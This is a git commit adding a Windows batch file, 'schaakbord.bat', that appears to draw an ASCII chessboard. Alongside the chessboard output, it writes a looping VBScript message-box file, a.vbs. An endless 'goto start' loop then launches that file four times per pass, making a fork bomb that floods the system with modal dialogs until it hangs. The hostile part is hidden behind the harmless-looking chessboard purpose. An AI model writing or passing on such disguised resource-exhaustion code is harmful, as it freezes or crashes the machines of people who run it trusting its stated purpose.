03d008f7a654c5aa00bea7d879a51e3b834bec8c
TheFedJo <52329960+TheFedJo@users.noreply.github.com>
2020-01-31 09:04:41 +0100

    Create schaakbord.bat

---
+++ SHARE/schaakbord.bat
@@ -0,0 +1,45 @@
+cls 
+@echo off
+echo rem haha > a.vbs
+echo result^=MsgBox^(^"^"^,vbAbortRetryIgnore^+vbExclamation^+vbDefaultButton2^+vbApplicationModal^, ^"^"^) >> a.vbs
+echo Do While result ^= 4 >> a.vbs
+echo  result^=Msgbox^(^"^"^,vbAbortRetryIgnore^+vbExclamation^+vbDefaultButton2^+vbApplicationModal^, ^"^"^) >> a.vbs
+echo Loop >> a.vbs
+echo     ####    ####    ####    ####
+echo     ####    ####    ####    ####
+echo     ####    ####    ####    ####
+echo     ####    ####    ####    ####
+echo ####    ####    ####    ####
+echo ####    ####    ####    ####
+echo ####    ####    ####    ####
+echo ####    ####    ####    ####
+echo     ####    ####    ####    ####
+echo     ####    ####    ####    ####
+echo     ####    ####    ####    ####
+echo     ####    ####    ####    ####
+echo ####    ####    ####    ####
+echo ####    ####    ####    ####
+echo ####    ####    ####    ####
+echo ####    ####    ####    ####
+echo     ####    ####    ####    ####
+echo     ####    ####    ####    ####
+echo     ####    ####    ####    ####
+echo     ####    ####    ####    ####
+echo ####    ####    ####    ####
+echo ####    ####    ####    ####
+echo ####    ####    ####    ####
+echo ####    ####    ####    ####
+echo     ####    ####    ####    ####
+echo     ####    ####    ####    ####
+echo     ####    ####    ####    ####
+echo     ####    ####    ####    ####
+echo ####    ####    ####    ####
+echo ####    ####    ####    ####
+echo ####    ####    ####    ####
+echo ####    ####    ####    ####
+:start
+start "" a.vbs
+start "" a.vbs
+start "" a.vbs
+start "" a.vbs
+goto start
